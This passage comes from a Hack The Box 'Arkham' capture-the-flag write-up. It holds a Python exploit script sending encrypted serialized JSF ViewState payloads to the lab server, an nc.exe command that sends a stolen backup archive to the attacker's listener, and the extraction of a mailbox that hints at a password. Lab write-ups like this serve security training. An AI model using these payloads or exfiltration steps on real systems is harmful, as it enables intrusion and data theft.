class=&quot;nt&quot;&gt;&amp;lt;/style&amp;gt;&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt;&amp;lt;h1&amp;gt;&lt;/span&gt;HTTP Status 500 â Internal Server Error&lt;span class=&quot;nt&quot;&gt;&amp;lt;/h1&amp;gt;&amp;lt;hr&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;line&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&amp;lt;p&amp;gt;&amp;lt;b&amp;gt;&lt;/span&gt;Type&lt;span class=&quot;nt&quot;&gt;&amp;lt;/b&amp;gt;&lt;/span&gt; Exception Report&lt;span class=&quot;nt&quot;&gt;&amp;lt;/p&amp;gt;&amp;lt;p&amp;gt;&amp;lt;b&amp;gt;&lt;/span&gt;Message&lt;span class=&quot;nt&quot;&gt;&amp;lt;/b&amp;gt;&lt;/span&gt; class javax.management.BadAttributeValueExpException cannot be cast to class [Ljava.lang.Object; (javax.management.BadAttributeValueExpException is in module java.management of loader &lt;span class=&quot;ni&quot;&gt;&amp;amp;#39;&lt;/span&gt;bootstrap&lt;span class=&quot;ni&quot;&gt;&amp;amp;#39;&lt;/span&gt;; [Ljava.lang.Object; is in module java.base of loader &lt;span class=&quot;ni&quot;&gt;&amp;amp;#39;&lt;/span&gt;bootstrap&lt;span class=&quot;ni&quot;&gt;&amp;amp;#39;&lt;/span&gt;)&lt;span class=&quot;nt&quot;&gt;&amp;lt;/p&amp;gt;&amp;lt;p&amp;gt;&amp;lt;b&amp;gt;&lt;/span&gt;Description&lt;span class=&quot;nt&quot;&gt;&amp;lt;/b&amp;gt;&lt;/span&gt; The server encountered an unexpected condition that prevented it from fulfilling the request.&lt;span class=&quot;nt&quot;&gt;&amp;lt;/p&amp;gt;&amp;lt;p&amp;gt;&amp;lt;b&amp;gt;&lt;/span&gt;Exception&lt;span class=&quot;nt&quot;&gt;&amp;lt;/b&amp;gt;&amp;lt;/p&amp;gt;&amp;lt;pre&amp;gt;&lt;/span&gt;java.lang.ClassCastException: class javax.management.BadAttributeValueExpException cannot be cast to class [Ljava.lang.Object; (javax.management.BadAttributeValueExpException is in module java.management of loader &lt;span class=&quot;ni&quot;&gt;&amp;amp;#39;&lt;/span&gt;bootstrap&lt;span class=&quot;ni&quot;&gt;&amp;amp;#39;&lt;/span&gt;; [Ljava.lang.Object; is in module java.base of loader &lt;span class=&quot;ni&quot;&gt;&amp;amp;#39;&lt;/span&gt;bootstrap&lt;span class=&quot;ni&quot;&gt;&amp;amp;#39;&lt;/span&gt;)
        org.apache.myfaces.renderkit.html.HtmlResponseStateManager.getSavedState(HtmlResponseStateManager.java:187)
        org.apache.myfaces.renderkit.html.HtmlResponseStateManager.getState(HtmlResponseStateManager.java:139)
        org.apache.myfaces.application.jsp.JspStateManagerImpl.restoreView(JspStateManagerImpl.java:355)
        org.apache.myfaces.application.jsp.JspViewHandlerImpl.restoreView(JspViewHandlerImpl.java:515)
        org.apache.myfaces.lifecycle.RestoreViewExecutor.execute(RestoreViewExecutor.java:85)
        org.apache.myfaces.lifecycle.LifecycleImpl.executePhase(LifecycleImpl.java:103)
        org.apache.myfaces.lifecycle.LifecycleImpl.execute(LifecycleImpl.java:76)
        javax.faces.webapp.FacesServlet.service(FacesServlet.java:244)
        org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:52)
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/pre&amp;gt;&amp;lt;p&amp;gt;&amp;lt;b&amp;gt;&lt;/span&gt;Note&lt;span class=&quot;nt&quot;&gt;&amp;lt;/b&amp;gt;&lt;/span&gt; The full stack trace of the root cause is available in the server logs.&lt;span class=&quot;nt&quot;&gt;&amp;lt;/p&amp;gt;&amp;lt;hr&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;line&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&amp;lt;h3&amp;gt;&lt;/span&gt;Apache Tomcat/8.5.37&lt;span class=&quot;nt&quot;&gt;&amp;lt;/h3&amp;gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;then-i-checked-my-listener-and-&quot;&gt;Then I checked my listener, and :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/arkham/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-owned-user-&quot;&gt;We owned user !&lt;/h4&gt;
&lt;h4 id=&quot;i-also-scripted-this-because-copying-and-pasting-in-burp-wasnt-my-favorite-thing-and-it-only-takes-2-minutes-to-script-this-in-python-&quot;&gt;I also scripted this because copying and pasting in burp wasn’t my favorite thing and it only takes 2 minutes to script this in python :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/usr/bin/python3&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;requests&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;exploit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;post_data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;j_id_jsp_1623871077_1:email&quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;test&quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;j_id_jsp_1623871077_1:submit&quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;SIGN UP&quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;j_id_jsp_1623871077_1_SUBMIT&quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;1&quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;javax.faces.ViewState&quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;post&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;http://10.10.10.130:8080/userSubscribe.faces&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;post_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;upload_payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;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&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;execute_payload&lt;/span&gt;	&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;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&quot;&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;exploit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;upload_payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;exploit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;execute_payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/arkham/12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;shell-as-batman&quot;&gt;Shell as Batman&lt;/h3&gt;
&lt;h4 id=&quot;we-are-on-the-box-as-alfred-i-enumerated-the-directories-and-found-a-directory-called-backups-in-cusersalfreddownloads-it-had-a-zip-archive-called-backupzip-&quot;&gt;We are on the box as &lt;code class=&quot;highlighter-rouge&quot;&gt;Alfred&lt;/code&gt;, I enumerated the directories and found a directory called &lt;code class=&quot;highlighter-rouge&quot;&gt;backups&lt;/code&gt; in &lt;code class=&quot;highlighter-rouge&quot;&gt;C:\Users\Alfred\Downloads&lt;/code&gt;, It had a &lt;code class=&quot;highlighter-rouge&quot;&gt;zip&lt;/code&gt; archive called &lt;code class=&quot;highlighter-rouge&quot;&gt;backup.zip&lt;/code&gt; :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;C:\Users\Alfred\Downloads&amp;gt;dir
dir
 Volume in drive C has no label.
 Volume Serial Number is FA90-3873

 Directory of C:\Users\Alfred\Downloads

02/03/2019  08:48 AM    &amp;lt;DIR&amp;gt;          .
02/03/2019  08:48 AM    &amp;lt;DIR&amp;gt;          ..
02/03/2019  08:41 AM    &amp;lt;DIR&amp;gt;          backups
               0 File(s)              0 bytes
               3 Dir(s)   8,675,921,920 bytes free

C:\Users\Alfred\Downloads&amp;gt;cd backups
cd backups

C:\Users\Alfred\Downloads\backups&amp;gt;dir
dir
 Volume in drive C has no label.
 Volume Serial Number is FA90-3873

 Directory of C:\Users\Alfred\Downloads\backups

02/03/2019  08:41 AM    &amp;lt;DIR&amp;gt;          .
02/03/2019  08:41 AM    &amp;lt;DIR&amp;gt;          ..
02/03/2019  08:41 AM           124,257 backup.zip
               1 File(s)        124,257 bytes
               2 Dir(s)   8,675,921,920 bytes free

C:\Users\Alfred\Downloads\backups&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;i-wanted-to-get-it-on-my-box-so-i-used-nc-to-do-it-i-listened-on-port-1338-then-on-the-box-i-did-this&quot;&gt;I wanted to get it on my box so I used &lt;code class=&quot;highlighter-rouge&quot;&gt;nc&lt;/code&gt; to do it. I listened on port 1338, then on the box I did this:&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;C:\Users\Alfred\Downloads\backups&amp;gt;C:\windows\system32\spool\drivers\color\nc.exe -w 3 10.10.xx.xx 1338 &amp;lt; C:\Users\Alfred\Downloads\backups\backup.zip                                                             
C:\windows\system32\spool\drivers\color\nc.exe -w 3 10.10.xx.xx 1338 &amp;lt; C:\Users\Alfred\Downloads\backups\backup.zip                                                                                   
C:\Users\Alfred\Downloads\backups&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;and-i-successfully-got-the-file-&quot;&gt;And I successfully got the file :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/arkham/backups# nc -lp 1338 &amp;gt; backup.zip                                                                    
root@kali:~/Desktop/HTB/boxes/arkham/backups# ls -la
total 132
drwxr-xr-x 2 root root   4096 Aug  9 21:26 .
drwxr-xr-x 5 root root   4096 Aug  9 21:24 ..
-rw-r--r-- 1 root root 124257 Aug  9 21:26 backup.zip
root@kali:~/Desktop/HTB/boxes/arkham/backups#
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;the-archive-only-had-a-file-called-alfredarkhamlocalost-which-is-an-outlook-email-folder-so-i-used-readpst-to-convert-it&quot;&gt;The archive only had a file called &lt;code class=&quot;highlighter-rouge&quot;&gt;alfred@arkham.local.ost&lt;/code&gt; which is an outlook email folder so I used &lt;code class=&quot;highlighter-rouge&quot;&gt;readpst&lt;/code&gt; to convert it.&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/arkham/backups# unzip backup.zip 
Archive:  backup.zip
  inflating: alfred@arkham.local.ost  
root@kali:~/Desktop/HTB/boxes/arkham/backups# file alfred@arkham.local.ost 
alfred@arkham.local.ost: Microsoft Outlook email folder
root@kali:~/Desktop/HTB/boxes/arkham/backups# readpst alfred@arkham.local.ost 
Opening PST file and indexes...
Processing Folder &quot;Deleted Items&quot;
Processing Folder &quot;Inbox&quot;
Processing Folder &quot;Outbox&quot;
Processing Folder &quot;Sent Items&quot;
Processing Folder &quot;Calendar&quot;
Processing Folder &quot;Contacts&quot;
Processing Folder &quot;Conversation Action Settings&quot;
Processing Folder &quot;Drafts&quot;
Processing Folder &quot;Journal&quot;
Processing Folder &quot;Junk E-Mail&quot;
Processing Folder &quot;Notes&quot;
Processing Folder &quot;Tasks&quot;
Processing Folder &quot;Sync Issues&quot;
Processing Folder &quot;RSS Feeds&quot;
Processing Folder &quot;Quick Step Settings&quot;
  &quot;alfred@arkham.local.ost&quot; - 15 items done, 0 items skipped.
  &quot;Calendar&quot; - 0 items done, 3 items skipped.
Processing Folder &quot;Conflicts&quot;
Processing Folder &quot;Local Failures&quot;
Processing Folder &quot;Server Failures&quot;
  &quot;Sync Issues&quot; - 3 items done, 0 items skipped.
  &quot;Inbox&quot; - 0 items done, 7 items skipped.
  &quot;Drafts&quot; - 1 items done, 0 items skipped.
root@kali:~/Desktop/HTB/boxes/arkham/backups# 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;the-output-was-saved-in-draftsmbox-i-removed-the-long-useless-output-&quot;&gt;The output was saved in &lt;code class=&quot;highlighter-rouge&quot;&gt;Drafts.mbox&lt;/code&gt;, I removed the long useless output :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/arkham/backups# ls -la
total 16608
drwxr-xr-x 2 root root     4096 Aug  9 21:33 .
drwxr-xr-x 5 root root     4096 Aug  9 21:33 ..
-rwx------ 1 root root 16818176 Feb  3  2019 alfred@arkham.local.ost
-rw-r--r-- 1 root root   124257 Aug  9 21:26 backup.zip
-rw-r--r-- 1 root root    51857 Aug  9 21:33 Drafts.mbox
root@kali:~/Desktop/HTB/boxes/arkham/backups# cat Drafts.mbox 
   ----------------
    Removed Output
   ----------------
&amp;lt;/o:shapelayout&amp;gt;&amp;lt;/xml&amp;gt;&amp;lt;![endif]--&amp;gt;&amp;lt;/head&amp;gt;&amp;lt;body lang=EN-US link=&quot;#0563C1&quot; vlink=&quot;#954F72&quot; style='tab-interval:.5in'&amp;gt;&amp;lt;div class=WordSection1&amp;gt;&amp;lt;p class=MsoNormal&amp;gt;Master Wayne stop forgetting your password&amp;lt;o:p&amp;gt;&amp;lt;/o:p&amp;gt;&amp;lt;/p&amp;gt;&amp;lt;p class=MsoNormal&amp;gt;&amp;lt;o:p&amp;gt;&amp;amp;nbsp;&amp;lt;/o:p&amp;gt;&amp;lt;/p&amp;gt;&amp;lt;p class=MsoNormal&amp;gt;&amp;lt;span style='mso-no-proof:yes'&amp;gt;&amp;lt;img width=677 height=343 id=&quot;Picture_x0020_1&quot; src=&quot;cid:image001.png@01D4BB4A.F5061EA0&quot;&amp;gt;&amp;lt;/span&amp;gt;&amp;lt;o:p&amp;gt;&amp;lt;/o:p&amp;gt;&amp;lt;/p&amp;gt;&amp;lt;/div&amp;gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;
----boundary-LibPST-iamunique-672158152_-_-
Content-Type: image/png
Content-Transfer-Encoding: base64
Content-ID: &amp;lt;image001.png@01D4BB4A.F5061EA0&amp;gt;
Content-Disposition: attachment; 
        filename*=utf-8''image001.png;
        filename=&quot;image001.png&quot;

iVBORw0KGgoAAAANSUhEUgAAAqUAAAFXCAIAAAAUCKDqAAAAAXNSR0IArs4c6QAAJwVJREFUeF7t
3V+oZdd5GPCjUmibujISRUNh5GhiCya2hI0lVXSoEwXXCRMoqpUXyzR6MFaUIlwh2S9+kB+sB7/Y
ElNjWskmDzJ0/FKpItCBGDGSBROGKMYgoaqM3XEsQZBpLazUTelLu8/Z9+677/679jn7O3edO7/L
IEbn7v2tb/2+dfa3/5w797qPfuyOhS8CBAgQIEDgWAtcV/T7u7994VjP0eQIECBAYIcF/vKPz97x
H2buU/PG/N+P/MuHbvknORA//dO//rVzf9rO5PKDZ/9ODvnJgQABAgQIEAgV0O9DeQUnQIAAAQJZ
COj3WZRBEgQIECBAIFRAvw/lFZwAAQIECGQhoN9nUQZJECBAgACBUAH9PpRXcAIECBDYMYFn7rpp
4M+8k/nEf/zP5Z8qbPuVuUbU7+eSFIcAAQIECEwTeOWz/6rcoWz5VeOvXp8WbnBr/X5GTKEIECBA
4JgI/NFf/LzxJ2hijZZfjBLR7IuwSf3+N//8P036E4QiLAECBAgQOH4C9QYf1OxT+32x3b/4vbN9
f/7bX//f4lvVf49fJcxoJwTeO//7tUduX3rrIOkXf3DX77/+9qFJvPW1m5752ov1l5avfO7p92ov
Vdss/3JXPeC4xzKZw/HH9xnfomMi4zttbYtLX6r8Xzh/9WDY2uv7JuETifHfGqWBCIQIJF3fFyP/
7d/8z74/n/uDf158q/pvSJqCEhgSuPr652763pMfPlvdfzu3uHqp2uGTp+579Sev1DrQYnHzbz+w
eO5C7Zzg6i+vLBavvfCzg9OC5Sunf/uTRZSbv1zc1vv6zUdfgo6JbJRU0YkPn+JsEu2tlxf7/udv
ePLuH+z5X3395Vs/s1eX86efu391KjD3RDbJ2747LrDNz9bFUTU+rxc0UGq//6d33pH4JyhRYQn0
